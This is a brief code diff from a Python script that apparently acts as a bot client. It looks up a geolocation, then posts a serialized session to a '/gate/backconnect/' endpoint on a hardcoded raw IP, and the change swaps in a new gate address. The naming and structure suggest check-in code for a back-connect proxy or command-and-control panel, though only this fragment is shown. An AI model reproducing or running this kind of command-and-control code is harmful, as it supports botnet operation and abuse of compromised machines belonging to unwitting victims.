@@ -13,5 +13,5 @@ session.port = 1
 
 print(requests.get('http://api.sypexgeo.net/json/95.179.127.220').json()['country']['iso'].lower())
 
-r = requests.post(url='http://213.183.51.129:80/gate/backconnect/', data=struct.pack('=I', 1) + session.SerializeToString())
+r = requests.post(url='http://185.250.151.137:80/gate/backconnect/', data=struct.pack('=I', 1) + session.SerializeToString())
 print(r.text)
